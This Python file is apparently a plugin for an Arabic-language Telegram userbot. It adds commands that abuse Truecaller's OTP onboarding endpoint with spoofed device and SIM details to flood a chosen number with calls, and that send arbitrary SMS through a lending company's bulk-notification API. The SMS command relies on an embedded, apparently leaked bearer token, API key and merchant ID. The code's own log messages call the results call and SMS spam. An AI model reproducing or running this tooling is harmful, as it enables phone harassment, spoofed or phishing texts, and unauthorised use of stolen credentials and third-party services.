import asyncio
import os
import re
import requests
import random
import datetime
import json
from time import sleep

try:
    import hashlib
except ModuleNotFoundError:
    os.system("pip3 install hashlib")
    import hashlib

from zira import zedub
from ..utils import Zed_Vip
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.utils import reply_id
from . import BOTLOG, BOTLOG_CHATID

Zel_Uid = zedub.uid
#d = {"notifications":[{"action":"REMINDER_SMS","phoneNumber":f"{num}","text":f"{mas}                 ، نذكركم بموعد سداد مبلغ ."}]}

dd = {"d":"Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJHSnFyR2c3NUR4Y0xKblJWS2ZrVEdqUGVRSnpqSnhGUTc2V2RxdWxmb0FzIn0.eyJleHAiOjE2ODMwMzA0NzIsImlhdCI6MTY4MzAyNjg3MiwianRpIjoiMzgzMzNiYTAtYmEyNi00YjcyLTkzOTMtODE3YTE1ZmJlNDAyIiwiaXNzIjoiaHR0cHM6Ly9pZGVudGl0eS5jYXNzYmFuYS5jb20vYXV0aC9yZWFsbXMvY2Fzc2JhbmEiLCJhdWQiOlsiYWRtaW4tYXBpLXNlcnZpY2UiLCJhY2NvdW50Il0sInN1YiI6ImM4ZmM3MjhlLTA3YWItNDcwZS04ZmM1LWUwMzk0NWJkOWFlNyIsInR5cCI6IkJlYXJlciIsImF6cCI6InByb2plY3R4Iiwic2Vzc2lvbl9zdGF0ZSI6ImVlNzJkZWI0LTlhZWQtNDU5Ni05NTRlLTNkNTkxMWJmZTA0ZCIsInJlYWxtX2FjY2VzcyI6eyJyb2xlcyI6WyJvZmZsaW5lX2FjY2VzcyIsImRlZmF1bHQtcm9sZXMtY2Fzc2JhbmEiLCJ1bWFfYXV0aG9yaXphdGlvbiJdfSwicmVzb3VyY2VfYWNjZXNzIjp7ImFkbWluLWFwaS1zZXJ2aWNlIjp7InJvbGVzIjpbImxpc3Qgc3VwcGxpZXIgbG9hbnMgcmVwb3J0IiwibGlzdCBzdXBwbGllciBkZWZhdWx0IHJhdGUgcmVwb3J0IiwibGlzdCBzdXBwbGllciBvdmVyYWxsIG1vbmV5IGNvbGxlY3RlZCByZXBvcnQiLCJsaXN0IHN1cHBsaWVyIGRlZmF1bHRlZCBtZXJjaGFudHMgcmVwb3J0IiwiZWRpdCBtZXJjaGFudCBob3dzIiwibGlzdCBzdXBwbGllciBjYXNoIHRyYW5zYWN0aW9uIHJlcG9ydCIsImxpc3Qgc3VwcGxpZXIgb3ZlcmFsbCBhY2NvdW50cyByZXBvcnQiLCJsaXN0IGFnZW50cyIsImxpc3QgbWVyY2hhbnRzIiwidmlldyBtZXJjaGFudCIsInZpZXcgc3VwcGxpZXIiXX0sInByb2plY3R4Ijp7InJvbGVzIjpbIm1lcmNoYW50Il19LCJhY2NvdW50Ijp7InJvbGVzIjpbIm1hbmFnZS1hY2NvdW50IiwibWFuYWdlLWFjY291bnQtbGlua3MiLCJ2aWV3LXByb2ZpbGUiXX19LCJzY29wZSI6Im9wZW5pZCBlbWFpbCBwcm9maWxlIiwic2lkIjoiZWU3MmRlYjQtOWFlZC00NTk2LTk1NGUtM2Q1OTExYmZlMDRkIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsIm1lcmNoYW50SWQiOiI2Mzc4YjRlODFlOWI4MWM5MmQyMGM4MzMiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiIrMjAxMDE2NzAxMTgyIiwidXNlcklkIjoiNjM3OGI0ZTgxZTliODFjOTJkMjBjODM1In0.ZDLi_96oMFNqKhisyaP0QTT6t5qbdkxv4EsAa02E9HIudB1xMdBfzt7MrzNFxY9BkGHFXFu4kjBiAB2bNX_jdtrUCcMpxezHH7f0P9EElLt0PtVQ5cNNoREYHNuwHZvEI5uF1HyEgsB2c-ZTsFKROK1OUTbbnIQWPEZvaX1aGi6srsk49nqCa2j2jplZYnunLFPtXyDusrLmbI8jU7GP4zECb9lw7bVDJsrgaqbkvqCqsoPHXEZu5RuZymh2_k-Wk-PoTRPl55m6_vZdrFrLtzekeJUU_OttMN6LxXti1Awfy1Z9SKmgBliggJJdpnmcUD48Ob24SMMywglmnlsIBw"}
def send(num,mas,t):
    u = "https://backend.svc.cashkateb.com/api/v1/notification/sms/bulk"
    h =  {
    "Host": "backend.svc.cashkateb.com",
    "authorization": t,
    "x-language": "AR",
    "platform": "ANDROID",
    "app-version": "2.6.3 (2630000)",
    "x-api-key": "6ca0cadd-3f78-4856-85e8-7d770f34ddaf-2563503853667f-b2ccb1dfc307",
    "device_id": "72a29479f0bf018f",
    "merchantid": "6378b4e81e9b81c92d20c833",
    "content-type": "application/json; charset\u003dUTF-8",
    "content-length": "252",
    "accept-encoding": "gzip",
    "user-agent": "okhttp/5.0.0-alpha.2"
  }
    d = {"notifications":[{"action":"REMINDER_SMS","phoneNumber":f"{num}","text":f"{mas}"}]}
    f = json.dumps(d)
    r = requests.post(u, headers=h,data=f).text
    if "successfully" in r:
        return True
    else:
        return r

def call(number):
    global headers
    asa = '123456789'
    gigk = str(''.join(random.choice(asa) for i in range(10)))
    md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]
    headers = {
    "Host": "account-asia-south1.truecaller.com",
    "content-type": "application/json; charset\u003dUTF-8",
    "content-length": "680",
    "accept-encoding": "gzip",
    "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
    "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
  }

    url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"

    data = '{"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"'+md5+'","language":"ar","manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android","osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar","sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849","mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,"minorVersion":34}},"phoneNumber":"'+number+'","region":"region-2","sequenceNo":1}'

    r = (requests.post(url, headers=headers, data=data).json())
    if r["message"] == "Sent" :
        return True
    else:
        return False


def send_sms(num,mas):
    number = str(num)
    url = "https://6418ac105c28.ngrok.io/sms"
    payload = {
        "PH": number,
        "MSG": mas
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(url, json=payload, headers=headers)
    return response.text


@zedub.zed_cmd(pattern="اتصل ?(.*)")
async def _(event):
    hv = event.pattern_match.group()
    #if Zel_Uid not in Zed_Vip:
        #return await edit_or_reply(event, "**⎉╎عـذࢪاً .. ؏ـزيـزي\n⎉╎هـذا الامـر ليـس مجـانـي📵\n⎉╎للاشتـراك في الاوامـر المدفوعـة\n⎉╎تواصـل مطـور السـورس @S_1_02\n⎉╎او التواصـل مـع احـد المشرفيـن @S_1_02**")
    input_str = event.pattern_match.group(1)
    if input_str.startswith("+"):
        zelzal = event.pattern_match.group(1)
    else:
        return await edit_or_reply(event, "**• ارسـل الامـر كالتالـي ...𓅫 :**\n`.اتصل` **+ ࢪقـم الهاتـف مـع ࢪمـز الدولـة\n• مثــال :**\n.اتصل +967777118223")
    num = event.pattern_match.group(1)
    c = call(num)
    if c is not True:
        await edit_or_reply(event, "**- تم استهلاك المحاولات المجانيه لهذا الرقم\n- انتظر ساعه او ارسل رقم آخر**")
    else:
        await edit_or_reply(event, "**تم ارسال الاتصال بنجاح✅**")
        if BOTLOG:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**- سبـام مكالمـات دوليـة 📲**\n"
                + f"ٴ**•────‌‌‏✯ 𝐋𝐈𝐓𝐇𝐎𝐍 ✯──‌‌‏─‌‌‏─•**\n**• تم الاتصـال بالرقـم .. بنجـاح ✅\n• رقـم الهاتـف 📞 :\n{num}**",
            )


"""@zedub.zed_cmd(pattern="sms ?(.*)")
async def _(event):
    hv = event.pattern_match.group()
    if Zel_Uid not in Zed_Vip:
        return await edit_or_reply(event, "**⎉╎عـذࢪاً .. ؏ـزيـزي\n⎉╎هـذا الامـر ليـس مجـانـي📵\n⎉╎للاشتـراك في الاوامـر المدفوعـة\n⎉╎تواصـل مطـور السـورس @S_1_02\n⎉╎او التواصـل مـع احـد المشرفيـن @S_1_02**")
    input_str = event.pattern_match.group(1)
    #if input_str.startswith("+"):
        #zelzal = event.pattern_match.group(1)
    #else:
        #return await edit_or_reply(event, "**╮ ارسـل .اتصل + ࢪقـم الهاتـف مـع ࢪمـز الدولـة 📲...𓅫╰**")
    if ":" in hv:
        hh = str(hv.split("sms "))
        num = hh.split(":")[0]
        mas = hh.split(":")[1]
        t = dd["d"]
        rs = send(num,mas,t)
        if rs is not True:
            await edit_or_reply(event, f"**- حدث خطأ اثناء ارسال الرساله⚠️**\n\n{rs}")
        else:
            await edit_or_reply(event, "**- تم ارسال الرساله بنجاح✅**")"""


@zedub.zed_cmd(pattern="sms(?: |$)([\s\S]*)")
async def _(event):
    num = event.pattern_match.group(1)
    reply = await event.get_reply_message()
    mas = reply.text
    if Zel_Uid not in Zed_Vip:
        return await edit_or_reply(event, "**⎉╎عـذࢪاً .. ؏ـزيـزي\n⎉╎هـذا الامـر ليـس مجـانـي📵\n⎉╎للاشتـراك في الاوامـر المدفوعـة\n⎉╎تواصـل مطـور السـورس @S_1_02\n⎉╎او التواصـل مـع احـد المشرفيـن @S_1_02**")
    if not num and reply:
        return await edit_or_reply(event, "**• ارسـل الامـر كالتالـي :**\n`.sms` **+ ࢪقـم الهاتـف مـع ࢪمـز الدولـة\n• مثــال :**\n.sms +967777118223\n**• بالـرد ع نـص الࢪسالـة النصية ...𓅫\n• المـࢪاد ارسالها لـ الرقـم المطلـوب 📲**")
    if not num:
        return await edit_or_reply(event, "**• ارسـل الامـر كالتالـي :**\n`.sms` **+ ࢪقـم الهاتـف مـع ࢪمـز الدولـة\n• مثــال :**\n.sms +967777118223\n**• بالـرد ع نـص الࢪسالـة النصية ...𓅫\n• المـࢪاد ارسالها لـ الرقـم المطلـوب 📲**")
    if num.startswith("+"):
        t = dd["d"]
        rs = send(num,mas,t)
        if rs is not True:
            await edit_or_reply(event, f"**- حدث خطأ اثناء ارسال الرساله⚠️**\n\n{rs}")
        else:
            await edit_or_reply(event, "**- تم ارسال الرساله بنجاح✅**")
            if BOTLOG:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "**- سبـام رسائـل نصيـة 💌**\n"
                    + f"ٴ**•────‌‌‏✯ 𝐋𝐈𝐓𝐇𝐎𝐍 ✯──‌‌‏─‌‌‏─•**\n**• تم إرسـال الرسالـة .. بنجـاح ✅\n• رقـم الهاتـف 📞 :**\n`{num}`\n**• الرسالـة المرسلـة 📩 :**\n`{mas}`",
                )
    else:
        return await edit_or_reply(event, "**• ارسـل الامـر كالتالـي :**\n`.sms` **+ ࢪقـم الهاتـف مـع ࢪمـز الدولـة\n• مثــال :**\n.sms +967777118223\n**• بالـرد ع نـص الࢪسالـة النصية ...𓅫\n• المـࢪاد ارسالها لـ الرقـم المطلـوب 📲**")


@zedub.zed_cmd(pattern="mms(?: |$)([\s\S]*)")
async def _(event):
    num = event.pattern_match.group(1)
    reply = await event.get_reply_message()
    mas = reply.text
    if num.startswith("+"):
        rs = send_sms(num,mas)
        await edit_or_reply(event, f"**- تم ارسال الرساله بنجاح✅**\n\n{rs}")
    else:
        return await edit_or_reply(event, "**• ارسـل الامـر كالتالـي :**\n`.mms` **+ ࢪقـم الهاتـف مـع ࢪمـز الدولـة\n• مثــال :**\n.mms +967777118223\n**• بالـرد ع نـص الࢪسالـة النصية ...𓅫\n• المـࢪاد ارسالها لـ الرقـم المطلـوب 📲**")
